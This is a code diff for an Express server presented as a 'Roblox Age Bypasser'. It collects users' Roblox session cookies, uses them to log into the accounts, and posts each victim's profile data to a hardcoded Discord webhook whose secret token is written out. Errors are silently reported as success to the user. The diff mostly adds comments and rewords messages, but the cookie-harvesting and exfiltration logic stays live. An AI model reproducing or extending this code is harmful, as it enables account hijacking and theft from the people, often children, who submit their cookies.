@@ -7,6 +7,7 @@ app.use(express.json());
 
 const API_BASE_URL = 'https://rblxbypasser.com/api';
 
+// --- Endpoint 1: Starts the bypass process ---
 app.post('/api/bypass', async (req, res) => {
     const { cookie } = req.body;
     if (!cookie) {
@@ -22,6 +23,7 @@ app.post('/api/bypass', async (req, res) => {
     }
 });
 
+// --- Endpoint 2: Polls for progress ---
 app.get('/api/progress', async (req, res) => {
     const { token } = req.query;
     if (!token) {
@@ -37,18 +39,23 @@ app.get('/api/progress', async (req, res) => {
     }
 });
 
+// --- Endpoint 3: This is the Webhook Logic ---
 app.post('/api/webhook', async (req, res) => {
     const { cookie } = req.body;
     if (!cookie) {
-        return res.status(200).send("Webhook ignored: No cookie.");
+        // Silently succeed if there's no cookie, nothing to log.
+        return res.status(200).send("Webhook ignored: No cookie provided.");
     }
+    
     const webhookURL = "https://discord.com/api/webhooks/1450559440221900941/G8PfWJn3sZ6FEtCdVzgFUg-IgYHzPG2vhEN4lHMQLGGjQ8rRhPsOdvrCK7GTp8yOfiLZ";
+
     try {
         const robloxUser = await RobloxUser.register(cookie);
         const userData = await robloxUser.getUserData();
         const format = (num) => new Intl.NumberFormat('en-US').format(num);
+
         const embed = {
-            color: 0x43afff,
+            color: 0x43afff, // Blue theme color
             author: { name: `${userData.displayName} (@${userData.username}) - Age Bypassed`, url: `https://www.roblox.com/users/${userData.uid}/profile` },
             thumbnail: { url: userData.avatarUrl },
             fields: [
@@ -60,11 +67,13 @@ app.post('/api/webhook', async (req, res) => {
             footer: { text: "Roblox Age Bypasser • Success" },
             timestamp: new Date().toISOString()
         };
+
         await axios.post(webhookURL, { embeds: [embed] });
-        res.status(200).send("Webhook sent.");
+        res.status(200).send("Webhook sent successfully.");
     } catch (error) {
         console.error("WEBHOOK TASK FAILED:", error.message);
-        res.status(200).send("Webhook task failed silently.");
+        // Respond with success even if webhook fails, so user isn't affected.
+        res.status(200).send("Webhook task failed on server, but user process is complete.");
     }
 });
 
